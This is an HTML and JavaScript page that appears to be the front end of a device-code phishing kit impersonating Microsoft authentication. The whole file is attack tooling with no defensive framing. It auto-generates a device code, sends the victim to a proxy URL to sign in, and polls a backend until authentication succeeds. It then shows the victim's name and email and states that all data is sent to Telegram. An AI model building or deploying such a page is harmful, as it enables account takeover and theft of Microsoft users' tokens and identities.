<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Microsoft Device Auth</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
      background: linear-gradient(135deg, #0078d4 0%, #00bcf2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: white;
      border-radius: 24px;
      padding: 50px 40px;
      max-width: 600px;
      width: 100%;
      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.3);
      text-align: center;
    }

    h1 {
      color: #0078d4;
      font-size: 36px;
      margin-bottom: 15px;
      font-weight: 700;
    }

    .subtitle {
      color: #666;
      font-size: 16px;
      margin-bottom: 40px;
      line-height: 1.6;
    }

    .code-box {
      background: linear-gradient(135deg, #fff9c4 0%, #fff59d 100%);
      border: 4px solid #ff9800;
      border-radius: 20px;
      padding: 45px;
      margin-bottom: 30px;
    }

    .code-label {
      color: #e65100;
      font-size: 14px;
      font-weight: 700;
      text-transform: uppercase;
      margin-bottom: 20px;
      letter-spacing: 2px;
    }

    .code {
      font-size: 80px;
      font-weight: 900;
      color: #ff6b00;
      letter-spacing: 20px;
      font-family: 'Courier New', monospace;
      margin: 25px 0;
      cursor: pointer;
      user-select: all;
      transition: all 0.3s;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
    }

    .code:hover {
      transform: scale(1.05);
      text-shadow: 0 0 25px rgba(255, 107, 0, 0.4);
    }

    .countdown {
      font-size: 28px;
      color: #ff6b00;
      font-weight: 700;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.5);
      border-radius: 10px;
    }

    .countdown.expiring {
      color: #d32f2f;
      animation: pulse 1s infinite;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }

    .btn {
      background: linear-gradient(135deg, #ff6b00 0%, #e65100 100%);
      color: white;
      border: none;
      padding: 24px 50px;
      border-radius: 14px;
      font-size: 19px;
      font-weight: 700;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      text-transform: uppercase;
      letter-spacing: 1.2px;
      box-shadow: 0 10px 25px rgba(255, 107, 0, 0.35);
      margin-top: 25px;
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-4px);
      box-shadow: 0 15px 35px rgba(255, 107, 0, 0.45);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #0078d4;
      border-radius: 50%;
      width: 70px;
      height: 70px;
      animation: spin 1s linear infinite;
      margin: 35px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .status {
      margin-top: 35px;
      padding: 25px;
      border-radius: 14px;
      font-weight: 700;
      font-size: 17px;
      background: #fff3cd;
      color: #856404;
      border: 3px solid #ffc107;
    }

    .status.success {
      background: #d4edda;
      color: #155724;
      border: 3px solid #28a745;
    }

    .success-section {
      display: none;
      margin-top: 50px;
      background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
      border: 4px solid #4caf50;
      border-radius: 20px;
      padding: 40px;
    }

    .success-section h2 {
      color: #2e7d32;
      font-size: 32px;
      margin-bottom: 30px;
    }

    .user-info {
      background: white;
      padding: 18px;
      border-radius: 12px;
      margin: 12px 0;
      border-left: 6px solid #4caf50;
      text-align: left;
    }

    .user-info strong {
      color: #2e7d32;
      display: block;
      font-size: 12px;
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .user-info span {
      color: #333;
      font-size: 17px;
      word-break: break-all;
    }

    .loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    @media (max-width: 600px) {
      .container {
        padding: 35px 25px;
      }

      .code {
        font-size: 56px;
        letter-spacing: 12px;
      }

      h1 {
        font-size: 28px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🔐 Microsoft Authentication</h1>
    <p class="subtitle">
      Auto-Generated Device Code<br>
      Lightning-Fast • Silent Permissions
    </p>

    <div class="code-box">
      <div class="code-label">Your Device Code</div>
      <div class="code" id="deviceCode" onclick="copy()">---</div>
      <div class="countdown" id="countdown">--:--</div>
    </div>

    <button class="btn" id="authBtn" onclick="authenticate()" disabled>
      Open Microsoft Authentication
    </button>

    <div class="loading">
      <div class="spinner" id="spinner"></div>
      <div class="status" id="status">
        Auto-generating code...
      </div>
    </div>

    <div class="success-section" id="successSection">
      <h2>✅ Complete!</h2>
      
      <div class="user-info">
        <strong>Name</strong>
        <span id="userName">---</span>
      </div>

      <div class="user-info">
        <strong>Email</strong>
        <span id="userEmail">---</span>
      </div>

      <p style="margin-top: 25px; text-align: center; color: #2e7d32; font-weight: 700; font-size: 16px;">
        📱 All data sent to Telegram in JSON format
      </p>
    </div>
  </div>

  <script>
    let state = {
      sessionId: null,
      userCode: null,
      proxyUrl: null,
      expiresAt: null,
      interval: 5,
      pollTimer: null,
      countdownTimer: null,
    };

    // AUTO-GENERATE ON PAGE LOAD
    window.addEventListener('load', () => {
      // Lightning-fast auto-generation
      setTimeout(generate, 100);
    });

    async function generate() {
      try {
        const res = await fetch('/api/device/generate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });

        const data = await res.json();

        state.sessionId = data.sessionId;
        state.userCode = data.userCode;
        state.proxyUrl = data.proxyUrl;
        state.expiresAt = new Date(Date.now() + data.expiresIn * 1000);
        state.interval = data.interval;

        // Display code
        document.getElementById('deviceCode').textContent = data.userCode;
        document.getElementById('authBtn').disabled = false;
        document.getElementById('status').textContent = 'Ready! Click button to authenticate';

        // Start countdown
        startCountdown();

        // Start polling
        startPolling();

      } catch (err) {
        console.error(err);
        document.getElementById('status').textContent = 'Error. Reload page.';
      }
    }

    function startCountdown() {
      state.countdownTimer = setInterval(() => {
        const remaining = Math.floor((state.expiresAt - Date.now()) / 1000);
        
        if (remaining <= 0) {
          clearInterval(state.countdownTimer);
          document.getElementById('countdown').textContent = 'EXPIRED';
          document.getElementById('countdown').classList.add('expiring');
          document.getElementById('status').textContent = 'Code expired. Reload page.';
          document.getElementById('spinner').style.display = 'none';
        } else {
          const m = Math.floor(remaining / 60);
          const s = remaining % 60;
          document.getElementById('countdown').textContent = m + ':' + (s < 10 ? '0' : '') + s;
          
          if (remaining < 120) {
            document.getElementById('countdown').classList.add('expiring');
          }
        }
      }, 1000);
    }

    function startPolling() {
      state.pollTimer = setInterval(async () => {
        try {
          const res = await fetch('/api/device/poll/' + state.sessionId);
          const data = await res.json();

          if (data.status === 'authenticated') {
            clearInterval(state.pollTimer);
            clearInterval(state.countdownTimer);
            
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('status').className = 'status success';
            document.getElementById('status').textContent = '✅ Complete! All data sent';

            document.getElementById('userName').textContent = data.user.displayName;
            document.getElementById('userEmail').textContent = data.user.email;
            document.getElementById('successSection').style.display = 'block';

          } else if (data.status === 'expired' || data.status === 'declined') {
            clearInterval(state.pollTimer);
            clearInterval(state.countdownTimer);
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('status').textContent = 'Authentication ' + data.status;
          }
        } catch (err) {
          console.error(err);
        }
      }, state.interval * 1000);
    }

    function copy() {
      if (state.userCode) {
        navigator.clipboard.writeText(state.userCode);
      }
    }

    function authenticate() {
      if (state.proxyUrl) {
        window.open(state.proxyUrl, '_blank');
      }
    }
  </script>
</body>
</html>
